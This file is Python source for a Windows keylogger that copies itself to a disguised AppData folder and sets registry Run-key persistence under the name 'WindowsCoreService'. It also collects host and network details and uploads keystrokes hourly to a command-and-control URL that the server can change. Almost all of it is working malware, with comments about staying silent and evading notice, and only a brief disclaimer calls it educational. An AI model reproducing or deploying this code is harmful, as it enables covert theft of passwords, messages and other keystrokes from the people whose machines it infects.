# combined_keylogger_exfil.py

# This script integrates a keylogger (pynput), enhanced Windows Registry
# persistence with self-copying, improved logging/data exfiltration,
# collection of system information (IP, MAC, Hostname, OS, Workgroup),
# AND the ability to dynamically update its C2 URL based on server response.

# WARNING: This script performs actions (logging keystrokes, modifying
# registry, self-copying, attempting to send data over network) that are
# typical of malware. Antivirus software will likely flag and quarantine
# this file.
# PLEASE USE THIS CODE RESPONSIBLY AND ONLY IN CONTROLLED, ISOLATED
# VIRTUAL ENVIRONMENTS FOR EDUCATIONAL AND RESEARCH PURPOSES.
# DO NOT DEPLOY OR USE THIS ON ANY UNAUTHORIZED SYSTEMS.

import pynput
from pynput.keyboard import Listener
import logging
import os
import sys
import winreg as reg
import requests # For making HTTP requests
import threading # For periodic data sending
import time # For time.sleep in the sending function
import uuid # For generating random names and MAC address
import shutil # For copying files
import socket # For hostname and IP address
import platform # For OS information

# --- Configuration ---
# Name for the registry entry to achieve persistence.
# Choose something inconspicuous to blend in with legitimate system processes.
PERSISTENCE_APP_NAME = "WindowsCoreService" # Disguised name for the registry entry

# Define a hidden directory for self-copy and log file storage.
# This will be created inside the user's AppData roaming folder.
# This makes it less obvious than being in the original download location.
PERSISTENCE_SUB_DIR = os.path.join(os.environ['APPDATA'], "SystemData_svc")

# Define the log file name. This will be a random name for stealth.
# The log file will be stored within the PERSISTENCE_SUB_DIR.
LOG_FILE_NAME = f"{uuid.uuid4().hex}.log"
LOG_FILE_PATH = os.path.join(PERSISTENCE_SUB_DIR, LOG_FILE_NAME)

# --- Data Exfiltration Configuration ---
# This is the initial placeholder URL for the attacker's Command and Control (C2) server.
# This variable can be updated dynamically by the C2 server's response.
C2_URL = "http://localhost:8000/upload_logs"

# How often (in seconds) to attempt to send the logs (1 hour = 3600 seconds).
EXFILTRATION_INTERVAL_SECONDS = 3600

# --- Global State for Logging Format ---
# This flag helps control whether to add a space before logging a special key
# if the current line already contains characters.
current_line_has_content = False

# --- Logging Setup ---
# Ensure the persistence directory exists before attempting to set up logging.
# This is critical if the log file is to be stored in this directory.
if not os.path.exists(PERSISTENCE_SUB_DIR):
    try:
        os.makedirs(PERSISTENCE_SUB_DIR)
        # print(f"[*] Created persistence directory: {PERSISTENCE_SUB_DIR}") # Silent for stealth
    except Exception as e:
        # If we can't create the directory, logging will fail, or log will be in original dir
        # For stealth, we suppress this error message for the end-user.
        pass

# Configure logging to write all INFO level messages to the specified LOG_FILE_PATH.
# 'filemode="a"' ensures new logs are appended.
# '%(message)s' format keeps the log file clean with just keystrokes.
logging.basicConfig(filename=LOG_FILE_PATH, level=logging.INFO,
                    format='%(message)s', filemode="a")

# Console messages for debugging/initial execution, will be suppressed with --noconsole
# print(f"[*] Combined Keylogger starting. Keystrokes will be logged to '{LOG_FILE_PATH}'.")
# print(f"[*] Initial C2 URL: {C2_URL}")
# print(f"[*] Attempting to send logs every {EXFILTRATION_INTERVAL_SECONDS} seconds.")
# print("[*] Press 'Esc' key to stop the keylogger (only works in non-compiled console mode).")

# --- System Information Collection ---

def get_system_info():
    """
    Collects various system details for initial logging.
    """
    info = {}
    try:
        info['hostname'] = socket.gethostname()
    except Exception:
        info['hostname'] = 'N/A'

    try:
        # Get local IP address (primary interface)
        # Note: This might return 127.0.0.1 if no external network connection
        info['ip_address'] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info['ip_address'] = 'N/A'

    try:
        # Get MAC address (first interface found)
        mac_num = uuid.getnode()
        mac_hex = ':'.join(['{:02x}'.format((mac_num >> i) & 0xff) for i in range(0, 12, 8)][::-1])
        info['mac_address'] = mac_hex
    except Exception:
        info['mac_address'] = 'N/A'

    try:
        # On Windows, USERDOMAIN env var often gives domain/workgroup
        info['workgroup'] = os.getenv('USERDOMAIN', 'N/A')
    except Exception:
        info['workgroup'] = 'N/A'

    try:
        info['os_name'] = platform.system()
        info['os_version'] = platform.version()
        info['os_platform'] = platform.platform() # More comprehensive OS info
    except Exception:
        info['os_name'] = 'N/A'
        info['os_version'] = 'N/A'
        info['os_platform'] = 'N/A'

    return info

def log_system_info():
    """
    Logs the collected system information to the keylog file.
    This function should be called once at the beginning of each log batch.
    """
    system_details = get_system_info()
    logging.info("\n--- System Information ---")
    for key, value in system_details.items():
        logging.info(f"{key.replace('_', ' ').title()}: {value}")
    logging.info("--------------------------\n")

# --- Persistence Function ---

def set_persistence():
    """
    Attempts to establish persistence by copying the executable to a disguised
    location (%APPDATA%\SystemData_svc with a random name) and adding an entry
    to the Windows Registry 'Run' key pointing to the copied executable.
    This function intelligently handles whether it's the initial execution
    or a persistent execution.
    """
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        # Generate a new random name for the copied executable (e.g., 'a1b2c3d4e5f6.exe')
        copied_exe_name = f"{uuid.uuid4().hex}.exe"
        copied_exe_path = os.path.join(PERSISTENCE_SUB_DIR, copied_exe_name)

        current_exe_path = os.path.abspath(sys.argv[0])

        # Check if the currently running executable is already in the designated
        # persistence directory. This prevents redundant copying.
        # Use os.path.normcase to handle potential case differences in paths on Windows.
        if os.path.normcase(current_exe_path) != os.path.normcase(copied_exe_path):
            # If not in the persistence directory, prepare for self-copy.
            # Ensure the target directory exists.
            if not os.path.exists(PERSISTENCE_SUB_DIR):
                os.makedirs(PERSISTENCE_SUB_DIR)
                # print(f"[*] Created persistence directory: {PERSISTENCE_SUB_DIR}") # Silent for stealth

            # Copy the current executable to the disguised location.
            # shutil.copy2 preserves metadata, which can make it slightly harder to detect.
            shutil.copy2(current_exe_path, copied_exe_path)
            # print(f"[*] Copied executable to: {copied_exe_path}") # Silent for stealth

            # Now, update the current_exe_path to the copied path,
            # so the registry entry points to the correct, persistent location.
            target_for_registry = copied_exe_path
        else:
            # If the executable is already running from the persistence directory,
            # then the registry entry should simply point to its current location.
            # print(f"[*] Executable already running from persistence location: {current_exe_path}") # Silent
            target_for_registry = current_exe_path

        # Set the registry key to point to the correct persistent executable path.
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, PERSISTENCE_APP_NAME, 0, reg.REG_SZ, target_for_registry)
        reg.CloseKey(key)

        # print(f"[*] Persistence set: '{PERSISTENCE_APP_NAME}' will run from '{target_for_registry}' on login.") # Silent
    except Exception as e:
        # print(f"[ERROR] Failed to set persistence: {e}") # Silent for stealth
        logging.error(f"Persistence failed: {e}")

# --- Data Exfiltration Function ---

def send_logs():
    """
    Reads the content of the log file and attempts to send it to the C2_URL
    via an HTTP POST request. After successful sending, it clears the local log.
    It also re-logs system information after clearing the log.
    """
    global C2_URL # Declare C2_URL as global to allow modification

    try:
        if not os.path.exists(LOG_FILE_PATH):
            # print("[*] Log file does not exist, nothing to send.") # Silent
            return

        with open(LOG_FILE_PATH, "r") as f:
            log_data = f.read()

        if not log_data.strip(): # Check if log_data is empty or just whitespace
            # print("[*] Log file is empty, skipping sending.") # Silent
            return

        # Prepare the data to be sent. Using a dictionary for JSON body.
        # Include username for better tracking on the C2 server.
        payload = {"keystrokes": log_data, "user_id": os.getenv('USERNAME', 'unknown_user')}
        headers = {'Content-Type': 'application/json'} # Specify content type

        # print(f"[*] Attempting to send {len(log_data)} bytes of logs to {C2_URL}...") # Silent for stealth
        # Send the POST request. Added a timeout to prevent hanging.
        response = requests.post(C2_URL, json=payload, headers=headers, timeout=15) # Increased timeout slightly

        # Check if the request was successful (HTTP status code 200)
        if response.status_code == 200:
            # print("[+] Logs sent successfully.") # Silent for stealth
            try:
                response_json = response.json()
                if "new_c2_url" in response_json and response_json["new_c2_url"]:
                    new_url = response_json["new_c2_url"].strip()
                    if new_url and new_url != C2_URL:
                        C2_URL = new_url
                        # print(f"[+] C2 URL updated to: {C2_URL}") # Silent for stealth
            except requests.exceptions.JSONDecodeError:
                # print("[-] Server response was not valid JSON.") # Silent
                pass # Server might not always send JSON, or it might be malformed
            except Exception as json_e:
                logging.error(f"Error processing JSON response for new C2 URL: {json_e}")

            # Clear the log file after successful transmission
            with open(LOG_FILE_PATH, "w") as f:
                f.write("")
            # print("[*] Local log file cleared.") # Silent for stealth
            log_system_info() # Log system info again after clearing for next batch
        else:
            # print(f"[-] Failed to send logs. Server responded with status code: {response.status_code}") # Silent
            # print(f"[-] Server response: {response.text}") # Silent
            pass # Keep silent for stealth

    except requests.exceptions.ConnectionError:
        # print(f"[-] Connection Error: Could not connect to C2 server at {C2_URL}.") # Silent
        pass
    except requests.exceptions.Timeout:
        # print(f"[-] Timeout Error: Request to C2 server at {C2_URL} timed out.") # Silent
        pass
    except requests.exceptions.RequestException as e:
        # print(f"[-] An error occurred while sending logs: {e}") # Silent
        logging.error(f"Error sending logs: {e}") # Log error internally
    except Exception as e:
        # print(f"[ERROR] An unexpected error occurred in send_logs: {e}") # Silent
        logging.error(f"Unexpected error in send_logs: {e}") # Log error internally

def send_logs_periodically():
    """
    Function to be run in a separate thread, sending logs at regular intervals.
    """
    # Ensure system info is logged at the very beginning of the first log batch
    if not os.path.exists(LOG_FILE_PATH) or os.stat(LOG_FILE_PATH).st_size == 0:
        log_system_info()

    send_logs() # Send logs immediately when starting (and re-logs system info)
    # Schedule the function to run again after EXFILTRATION_INTERVAL_SECONDS
    # The daemon=True argument ensures the thread exits cleanly when the main program exits.
    threading.Timer(EXFILTRATION_INTERVAL_SECONDS, send_logs_periodically).start()

# --- Keylogger Callbacks ---

def on_press(key):
    """
    Callback function executed by pynput when a key is pressed.
    It logs the key press to the configured log file with refined formatting.
    """
    global current_line_has_content
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Log regular characters directly
            logging.info(f'{key.char}')
            current_line_has_content = True
        elif key == pynput.keyboard.Key.space:
            # Log space as a single space character
            logging.info(' ')
            current_line_has_content = True
        elif key == pynput.keyboard.Key.enter:
            # Log Enter as a newline character and reset content flag
            logging.info('\n')
            current_line_has_content = False
        else:
            # For other special keys (e.g., Shift, Ctrl, Alt, Tab, Backspace)
            # Log their name in brackets. Add a space before if the current line has content.
            key_name = str(key).replace('Key.', '')
            # A more refined check for functional keys that might not need a preceding space
            functional_keys = [
                pynput.keyboard.Key.f1, pynput.keyboard.Key.f2, pynput.keyboard.Key.f3,
                pynput.keyboard.Key.f4, pynput.keyboard.Key.f5, pynput.keyboard.Key.f6,
                pynput.keyboard.Key.f7, pynput.keyboard.Key.f8, pynput.keyboard.Key.f9,
                pynput.keyboard.Key.f10, pynput.keyboard.Key.f11, pynput.keyboard.Key.f12,
                pynput.keyboard.Key.alt_l, pynput.keyboard.Key.alt_r,
                pynput.keyboard.Key.ctrl_l, pynput.keyboard.Key.ctrl_r,
                pynput.keyboard.Key.shift_l, pynput.keyboard.Key.shift_r,
                pynput.keyboard.Key.cmd_l, pynput.keyboard.Key.cmd_r,
                pynput.keyboard.Key.tab, pynput.keyboard.Key.esc,
                pynput.keyboard.Key.caps_lock, pynput.keyboard.Key.num_lock,
                pynput.keyboard.Key.scroll_lock, pynput.keyboard.Key.print_screen,
                pynput.keyboard.Key.pause, pynput.keyboard.Key.insert,
                pynput.keyboard.Key.delete, pynput.keyboard.Key.home,
                pynput.keyboard.Key.end, pynput.keyboard.Key.page_up,
                pynput.keyboard.Key.page_down, pynput.keyboard.Key.up,
                pynput.keyboard.Key.down, pynput.keyboard.Key.left,
                pynput.keyboard.Key.right, pynput.keyboard.Key.backspace # Backspace usually acts on preceding char, so a space before its log can be useful
            ]

            if current_line_has_content and key not in functional_keys:
                logging.info(f' [{key_name}]')
            else:
                logging.info(f'[{key_name}]')
            current_line_has_content = True # Special keys still indicate content on the line

    except Exception as e:
        # Suppress error output for stealth
        # print(f"[ERROR] Error capturing key: {e}")
        logging.error(f"Error in on_press: {e}") # Log error internally

def on_release(key):
    """
    Callback function executed by pynput when a key is released.
    This function is used to define a stopping condition for the keylogger.
    """
    if key == pynput.keyboard.Key.esc:
        # print("[*] 'Esc' key pressed. Stopping keylogger.") # Silent for stealth
        return False # Returning False stops the pynput Listener

# --- Main Execution Flow ---
if __name__ == "__main__":
    # 1. Attempt to set persistence. This will also handle self-copying.
    set_persistence()

    # 2. Start the periodic log sending in a separate thread.
    # This ensures that the keylogger listener is not blocked while sending data.
    # print(f"[*] Starting periodic log exfiltration thread (every {EXFILTRATION_INTERVAL_SECONDS}s)...") # Silent
    send_logs_periodically()

    # 3. Start the keyboard listener.
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join() # Blocks until the listener is stopped (e.g., by 'Esc' key)
    except Exception as e:
        # print(f"[ERROR] An unexpected error occurred in the keylogger loop: {e}") # Silent
        logging.error(f"Main keylogger loop error: {e}") # Log error internally
    finally:
        # These final print statements will only be visible if run directly, not in --noconsole mode
        # print(f"[*] Keylogger session ended. Logs saved to '{os.path.abspath(LOG_FILE_PATH)}'.")
        pass # Keep silent for stealth
